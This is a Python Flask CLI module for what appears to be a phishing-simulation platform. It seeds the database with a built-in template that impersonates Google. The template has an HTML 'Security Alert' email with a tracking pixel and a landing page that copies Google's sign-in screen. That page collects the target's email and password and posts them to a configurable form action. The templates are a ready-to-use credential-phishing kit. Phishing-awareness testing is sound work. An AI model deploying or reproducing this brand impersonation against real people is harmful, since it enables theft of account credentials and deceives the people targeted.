"""Flask CLI commands for database seeding."""
import click
from flask import current_app
from flask.cli import with_appcontext

from app.extensions import db
from app.models import User, Template


# ── Google Security Alert (EN) ────────────────────────────────────────────────

_GOOGLE_EMAIL_HTML = """\
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="https://github.com/PassAndSecure/Template_Gophish/blob/main/Picture-Template/gophish-gmail-logo.png?raw=true"/>
    <title>Security Alert - {{.Email}}</title>
    <style>
        @font-face {
            font-family: 'Google Sans';
            src: url('https://github.com/PassAndSecure/Template_Gophish/tree/main/Picture-Template/font-google/GoogleSans-Regular.woff2') format('woff2');
            font-weight: 400;
            font-style: normal;
        }
        @font-face {
            font-family: 'Google Sans';
            src: url('https://github.com/PassAndSecure/Template_Gophish/tree/main/Picture-Template/font-google/GoogleSans-Bold.woff2') format('woff2');
            font-weight: 500;
            font-style: normal;
        }
        body {
            font-family: Arial, sans-serif;
            background-color: #FFFFFF;
            margin: 0;
            padding: 20px;
        }
        .email-container {
            max-width: 516px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 8px;
            overflow: hidden;
            border: 2px solid #DADCE0;
            padding-bottom: 20px;
            padding: 40px 20px;
            min-width: 220px;
        }
        .email-header {
            background-color: #FFFFFF;
            color: #ffffff;
            padding: 20px;
            text-align: center;
            margin-top: -40px;
        }
        .email-body {
            text-align: center;
            padding: 20px;
            margin-top:-40px;
            color: #333333;
        }
        .email-footer {
            background-color: #FFFFFF;
            padding: 5px;
            font-size: 12px;
            color: #666666;
            text-align: center;
        }
        .email-body p {
            margin: 10px 0;
        }
        .btn-primary {
            background-color: #4285f4;
            color: #ffffff;
            text-decoration: none;
            padding: 10px 20px;
            border-radius: 5px;
            display: inline-block;
            margin: 20px 0;
        }
        .btn-primary:hover {
            background-color: #357ae8;
        }
        .email-footer a {
            color: #4285f4;
            text-decoration: none;
        }
        .avatar {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 16px;
            margin-right: 10px;
        }
        .flex-center {
            display: flex;
            align-items: center;
            justify-content: center;
        }
    </style>
</head>
<body>
    <div class="email-container">
        <div class="email-header">
            <img src="https://github.com/PassAndSecure/Template_Gophish/blob/main/Picture-Template/gophish-gmail.png?raw=true" alt="Google Logo" style="height: 40px; margin-top:20px;">
        </div>
        <div class="email-body">
            <h2 style="font-family: 'Google Sans', sans-serif; font-size: 26px; font-weight: 400; line-height: 32px;">New Sign-In from New York</h2>
            <div class="flex-center" style="font-family: 'Google Sans', sans-serif; font-size: 14px; font-weight: 400; line-height: 20px; margin-top:-20px;">
                <p>{{.Email}}</p>
            </div>
            <hr style="margin-top: 25px; color: #DADCE069">
            <p style="margin-top: 25px; font-family: 'Helvetica', sans-serif; font-size: 16px; font-weight: 400; line-height: 20px;">We detected a new sign-in to your Google account from <b>New York</b>. If this was you, no action is required. Otherwise, we will help you secure your account.</p>
            <a href="{{.URL}}" class="btn-primary" target="_blank" rel="noopener" style="text-decoration: none;">Review Activity</a>
            <p style="color: #5f6368; font-family: 'Arial', sans-serif; font-size: 15px; font-weight: 400; line-height: 16px;">You can also view your account's security-related activity here: </p>
            <p style="font-family: 'Arial', sans-serif; font-size: 15px; font-weight: 400; line-height: 16px; margin-top: -7px; margin-bottom:-10px;">https://myaccount.google.com/notifications</p>
        </div>
    </div>
    <div class="email-footer">
        <p>This email was sent to inform you of important changes to your account and Google services you use.</p>
        <p>&copy; 2024 Google Ireland Ltd., Gordon House, Barrow Street, Dublin 4, Ireland</p>
    </div>
    {{TRACKING_PIXEL}}
</body>
</html>
"""

_GOOGLE_LANDING_HTML = """\
<!DOCTYPE html><html lang="fr"><head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Login - Google Accounts</title>
    <link rel="shortcut icon" href="https://github.com/PassAndSecure/Template_Gophish/blob/main/Picture-Template/logo_google-1.png?raw=true"/>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"/>
    <style>
        @font-face {
            font-family: 'Google Sans';
            src: url('https://github.com/PassAndSecure/Template_Gophish/tree/main/Picture-Template/font-google/GoogleSans-Regular.woff2') format('woff2');
            font-weight: 400;
            font-style: normal;
        }
        @font-face {
            font-family: 'Google Sans';
            src: url('https://github.com/PassAndSecure/Template_Gophish/tree/main/Picture-Template/font-google/GoogleSans-Bold.woff2') format('woff2');
            font-weight: 500;
            font-style: normal;
        }
        body {
            background-color: #f0f4f9;
            font-family: 'Google Sans', sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            padding: 40px;
            border-radius: 28px;
            width: 1140px;
            height: 400px;
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        .login-left, .login-right {
            width: 50%;
        }
        .login-left {
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            margin-top: -140px;
        }
        .login-header {
            margin-bottom: 20px;
        }
        .login-header img {
            height: 45px;
            margin-bottom: 10px;
        }
        h2 {
            font-size: 36px;
            line-height: 44px;
            color: #1f1f1f;
            margin-bottom: 10px;
            font-weight: 400;
        }
        p {
            font-size: 16px;
            line-height: 24px;
            color: #1f1f1f;
            margin-bottom: 20px;
        }
        .form-group input {
            width: 96%;
            padding: 28px;
            margin-bottom: 10px;
            margin-left: 23px;
            border: 1px solid grey;
            border-radius: 4px;
            font-size: 18px;
            color: black;
        }
        .form-group input::placeholder {
            width: 96%;
            padding: 28px;
            margin-bottom: 10px;
            margin-left: 23px;
            border: 1px solid grey;
            border-radius: 4px;
            font-size: 15px;
        }
        .form-group-3 input {
            width: 96%;
            padding: 28px;
            margin-bottom: 10px;
            margin-left: 23px;
            border: 1px solid grey;
            border-radius: 4px;
            font-size: 15px;
            color: black;
        }
        .form-group-3 input::placeholder {
            width: 96%;
            padding: 28px;
            margin-bottom: 10px;
            margin-left: 23px;
            border: 1px solid grey;
            border-radius: 4px;
            font-size: 15px;
        }
        .form-group-2 input[type="checkbox"] {
            transform: scale(1.2);
            background-color: #fff;
            border: 3px solid black;
            width: 16px;
            height: 16px;
            cursor: pointer;
            position: relative;
            display: inline-block;
            margin-left: 5px;
            margin-right: 17px;
            vertical-align: middle;
        }
        .form-group-2 input[type="checkbox"]:checked::before {
            content: '\\2713';
            font-size: 17px;
            position: absolute;
            border: 3px solid black;
            top: -9px;
            left: -1px;
        }
        .btn-link {
            font-size: 0.875rem;
            color: #0b57d0;
            font-weight: 500;
            text-decoration: none;
            position: relative;
            margin-left: 23px;
        }
        .btn-link:hover {
            background-color: #F0F4F9;
            color: #0b57d0;
            margin-left: 21px;
            padding:2px;
            border-radius: 15px;
            text-decoration: none;
        }
        .info-text {
            font-size: 14px;
            line-height: 20px;
            color: #444746;
            margin: 10px 0;
            margin-left: 23px;
            margin-top: 45px;
        }
        .info-link {
            font-size: 14px;
            line-height: 20px;
            color: #0b57d0;
            font-weight: 500;
            text-decoration: none;
        }
        .info-link:hover {
            background-color: #F0F4F9;
            color: #0b57d0;
            margin-left: -2px;
            padding:2px;
            border-radius: 15px;
            text-decoration: none;
        }
        .info-link-2 {
            font-size: 14px;
            line-height: 20px;
            color: #0b57d0;
            font-weight: 500;
            text-decoration: none;
            margin-left: 270px;
        }
        .info-link-2:hover {
            background-color: #F0F4F9;
            color: #0b57d0;
            padding: 10px 20px 10px 20px;
            margin-left: 250px;
            border-radius: 30px;
            text-decoration: none;
        }
        .footer-links {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .btn-primary {
            background-color: #0B57D0;
            border-color: #0B57D0;
            color: #fff;
            font-size: 14px;
            font-weight: 500;
            width: 19%;
            padding: 9px;
            border-radius: 20px;
        }
        .bottom-links {
            display: flex;
            justify-content: space-between;
            width: 100%;
            max-width: 1095px;
        }
        .bottom-links-2 {
            display: flex;
            justify-content: space-between;
            width: 100%;
            max-width: 1095px;
        }
        .custom-text {
            font-family: 'Google Sans', sans-serif;
            font-size: 13px;
            line-height: 20px;
            color: #1f1f1f;
        }
        .bottom-link:hover {
            background-color:#EBEBEB;
            color: black;
            padding:8px;
            border-radius: 8px;
            text-decoration: none;
            margin-left:-8px;
        }
        .bottom-link-2:hover {
            background-color:#EBEBEB;
            color: black;
            padding:8px;
            border-radius: 8px;
            text-decoration: none;
            margin-left:-8px;
        }
        #emailButton {
            display: none;
            max-width: 80%;
            padding: 3px;
            margin-bottom: 10px;
            border: 1px solid grey;
            border-radius: 15px;
            background-color: white;
            text-align: left;
            cursor: pointer;
            align-items: center;
            justify-content: space-between;
        }
        .avatar {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            margin-right: 10px;
            font-size: 16px;
        }
        .arrow {
            margin-right:15px;
        }
        .arrow-2 {
            margin-left:65px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-left">
            <div class="login-header">
                <img src="https://github.com/PassAndSecure/Template_Gophish/blob/main/Picture-Template/logo_google-1.png?raw=true" alt="Google Logo"/>
            </div>
            <h2 id="userName">Sign In</h2>
            <button id="emailButton" onclick="showEmailSection()"></button>
            <p id="googleAccountText">Use your Google Account</p>
        </div>
        <div class="login-right">
            <form id="loginForm" method="post" action="{{FORM_ACTION}}">
                <div id="emailSection">
                    <div class="form-group" style="margin-bottom: -3px;">
                        <input type="email" class="form-control" id="email" name="email" placeholder="Email or phone number" value="{{.Email}}" required=""/>
                    </div>
                    <a href="https://accounts.google.com/signin/v2/usernamerecovery?" class="btn-link">Forgot email?</a>
                    <div class="info-text">
                        If this isn't your computer, use a private browsing window to sign in. <a href="https://support.google.com/accounts?p=signin_privatebrowsing&amp;hl=en" class="info-link" target="_blank" rel="noopener">Learn more about using Guest mode</a>
                    </div>
                    <div class="footer-links">
                        <a href="#" class="info-link-2" style="margin-bottom: -110px;">Create account</a>
                        <button type="button" class="btn btn-primary" style="margin-bottom: -110px;" onclick="showPasswordSection()">Next</button>
                    </div>
                </div>
                <div id="passwordSection" style="display: none;">
                    <div class="form-group-3" style="margin-bottom: -3px;">
                        <input type="password" class="form-control" id="password" name="password" placeholder="Enter your password" required=""/>
                    </div>
                    <div class="form-group-2" style="margin-left: 23px;">
                        <input type="checkbox" id="showPasswordCheckbox" class="custom-checkbox" onclick="togglePasswordVisibility()"/>
                        <label for="showPasswordCheckbox">Show password</label>
                    </div>
                    <div class="footer-links">
                        <a href="https://www.google.com/url?sa=t&amp;source=web&amp;rct=j&amp;opi=89978449&amp;url=https://takeout.google.com" class="info-link-2" style="margin-bottom: -220px; margin-left: 240px;">Forgot password?</a>
                        <button type="submit" class="btn btn-primary" style="margin-bottom: -220px;">Next</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
    <div class="bottom-links custom-text">
        <div>
            <a href="#" class="bottom-link custom-text" style="margin-right:650px;">English (United States)
            <span class="arrow-2"><i class="fa-solid fa-caret-down"></i></span>
            </a>
            <a href="https://support.google.com/accounts?hl=en&amp;p=account_iph" class="bottom-link-2 custom-text" style="margin-right: 30px;" target="_blank" rel="noopener">Help</a>
            <a href="https://accounts.google.com/TOS?loc=US&amp;hl=en&amp;privacy=true" class="bottom-link-2 custom-text" style="margin-right: 30px;" target="_blank" rel="noopener">Privacy</a>
            <a href="https://accounts.google.com/TOS?loc=US&amp;hl=en" class="bottom-link-2 custom-text" target="_blank" rel="noopener">Terms</a>
        </div>
    </div>

    <script>
        function showPasswordSection() {
            const email = document.getElementById('email').value;
            const emailParts = email.split('@')[0].split('.');
            const firstName = emailParts[0].charAt(0).toUpperCase() + emailParts[0].slice(1);
            const lastName = emailParts[1] ? emailParts[1].toUpperCase() : '';
            const userName = firstName + (lastName ? ' ' + lastName : '');

            const initial = email.charAt(0).toUpperCase();
            const randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);

            document.getElementById('userName').textContent = userName;

            const emailButton = document.getElementById('emailButton');
            emailButton.innerHTML = `
                <div style="display: flex; align-items: center;">
                    <div class="avatar" style="background-color: ${randomColor};">${initial}</div>
                    <span>${email}</span>
                </div>
                <i class="fa-solid fa-caret-down arrow"></i>
            `;
            emailButton.style.display = 'flex';

            document.getElementById('googleAccountText').style.display = 'none';
            document.getElementById('emailSection').style.display = 'none';
            document.getElementById('passwordSection').style.display = 'block';
        }

        function showEmailSection() {
            document.getElementById('userName').textContent = 'Sign In';
            document.getElementById('emailButton').style.display = 'none';
            document.getElementById('googleAccountText').style.display = 'block';
            document.getElementById('passwordSection').style.display = 'none';
            document.getElementById('emailSection').style.display = 'block';
        }

        function togglePasswordVisibility() {
            const passwordField = document.getElementById('password');
            if (document.getElementById('showPasswordCheckbox').checked) {
                passwordField.type = 'text';
            } else {
                passwordField.type = 'password';
            }
        }

    </script>
</body>
</html>
"""

_TEMPLATES = [
    {
        'name': 'Google - Security Alert (EN)',
        'subject': 'Security Alert - New Sign-In from New York',
        'email_html': _GOOGLE_EMAIL_HTML,
        'landing_page_html': _GOOGLE_LANDING_HTML,
    },
]


def register_commands(app):
    """Register Flask CLI commands with the app."""

    @app.cli.command('seed-templates')
    @with_appcontext
    def seed_templates():
        """Pre-install built-in phishing templates (idempotent)."""
        admin = db.session.query(User).filter_by(is_admin=True).first()
        if admin is None:
            admin = db.session.query(User).first()
        if admin is None:
            click.echo('No users found — create an admin account first.', err=True)
            return

        inserted = 0
        for tpl in _TEMPLATES:
            exists = db.session.query(Template).filter_by(name=tpl['name']).first()
            if exists:
                click.echo(f"  skip  {tpl['name']!r} (already exists)")
                continue
            db.session.add(Template(
                name=tpl['name'],
                subject=tpl['subject'],
                email_html=tpl['email_html'],
                landing_page_html=tpl['landing_page_html'],
                created_by_user_id=admin.id,
            ))
            inserted += 1
            click.echo(f"  add   {tpl['name']!r}")

        if inserted:
            db.session.commit()

        click.echo(f'Done — {inserted} template(s) inserted.')
